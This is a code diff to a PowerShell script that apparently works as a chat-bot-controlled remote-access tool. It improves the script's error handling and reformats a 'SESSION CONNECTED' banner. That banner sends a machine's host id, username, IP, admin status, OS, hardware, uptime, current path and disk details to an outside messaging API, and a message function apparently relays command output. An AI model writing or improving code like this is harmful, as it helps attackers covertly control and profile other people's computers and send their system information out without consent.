@@ -26,8 +26,13 @@ function SendRaw($text) {
         text       = $text
     } | ConvertTo-Json -Depth 5
 
-    try { Invoke-RestMethod -Method Post -Uri $api_send -Body $body -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null }
-    catch { Start-Sleep -Seconds 3 }
+    try {
+        $r = Invoke-RestMethod -Method Post -Uri $api_send -Body $body -ContentType "application/json; charset=utf-8" -WebSession $session
+        if (-not $r.ok) { Write-Host "SendRaw error: $($r | ConvertTo-Json)" }
+    } catch {
+        Write-Host "SendRaw exception: $($_.Exception.Message)"
+        Start-Sleep -Seconds 3
+    }
 }
 
 function SendMessage($output, $cmd = "") {
@@ -96,18 +101,20 @@ function SendConnectBanner {
         "*$($_.Name):\\* $(EscapeMd "$free GB free / $total GB")"
     }
 
+    $dot = [char]0x00B7
+
     $lines = @(
         "*SESSION CONNECTED*"
         ""
-        "*Host* `u{00B7} $(EscapeMd $session_id)"
-        "*User* `u{00B7} $(EscapeMd $env:USERNAME)"
-        "*IP* `u{00B7} $(EscapeMd $ip)"
-        "*Admin* `u{00B7} $admin"
-        "*OS* `u{00B7} $(EscapeMd $os.Caption)"
-        "*CPU* `u{00B7} $(EscapeMd $cpu)"
-        "*RAM* `u{00B7} $(EscapeMd "$ram_used GB / $ram_total GB")"
-        "*Uptime* `u{00B7} $(EscapeMd $uptime_str)"
-        "*Path* `u{00B7} $(EscapeMd ((Get-Location).Path))"
+        "*Host* $dot $(EscapeMd $session_id)"
+        "*User* $dot $(EscapeMd $env:USERNAME)"
+        "*IP* $dot $(EscapeMd $ip)"
+        "*Admin* $dot $admin"
+        "*OS* $dot $(EscapeMd $os.Caption)"
+        "*CPU* $dot $(EscapeMd $cpu)"
+        "*RAM* $dot $(EscapeMd "$ram_used GB / $ram_total GB")"
+        "*Uptime* $dot $(EscapeMd $uptime_str)"
+        "*Path* $dot $(EscapeMd ((Get-Location).Path))"
         ""
         "*Disks*"
     ) + $disks
